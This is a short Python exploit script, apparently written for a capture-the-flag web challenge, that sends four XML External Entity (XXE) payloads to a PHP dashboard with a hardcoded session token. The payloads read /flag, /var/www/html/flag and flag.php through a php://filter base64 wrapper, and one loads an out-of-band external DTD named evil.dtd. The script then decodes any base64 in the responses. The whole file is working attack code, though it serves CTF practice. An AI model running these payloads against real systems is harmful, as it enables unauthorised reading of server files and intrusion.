import requests

url = 'http://80-3829ff0b-6e88-4697-9c89-87d2b7b04632.challenge.ctfplus.cn/dashboard.php'
cookies = {'token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3NzQ3MDY3MTJ9.CqErZOY8Ac-MBNgnLOXKu8G1WJlUzOIcrIkpu9ji6gA'}

# 测试各种 XXE payload
xxe_payloads = [
    # 1. 基本 XXE
    """<?xml version="1.0"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag"> ]>
    <data>&xxe;</data>""",

    # 2. 读取 flag.php
    """<?xml version="1.0"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php"> ]>
    <data>&xxe;</data>""",

    # 3. 读取 /var/www/html/flag
    """<?xml version="1.0"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/www/html/flag"> ]>
    <data>&xxe;</data>""",

    # 4. OOB XXE - 尝试外带
    """<?xml version="1.0"?>
    <!DOCTYPE foo [
        <!ENTITY % xxe SYSTEM "http://localhost:8080/evil.dtd">
        %xxe;
    ]>
    <data>test</data>""",
]

for i, payload in enumerate(xxe_payloads, 1):
    print(f"\n=== Testing payload {i} ===")
    print(f"Payload: {payload[:100]}...")

    headers = {'Content-Type': 'application/xml'}
    try:
        resp = requests.post(url, data=payload, headers=headers, cookies=cookies, timeout=5)
        print(f"Status: {resp.status_code}")
        print(f"Response: {resp.text[:800]}")

        # 检查是否包含 base64 编码的数据
        import base64
        import re
        base64_matches = re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', resp.text)
        if base64_matches:
            for match in base64_matches[:3]:
                try:
                    decoded = base64.b64decode(match + '=='[: (4 - len(match) % 4) % 4]).decode('utf-8', errors='ignore')
                    print(f"Decoded: {decoded[:200]}")
                except:
                    pass

    except Exception as e:
        print(f"Error: {e}")
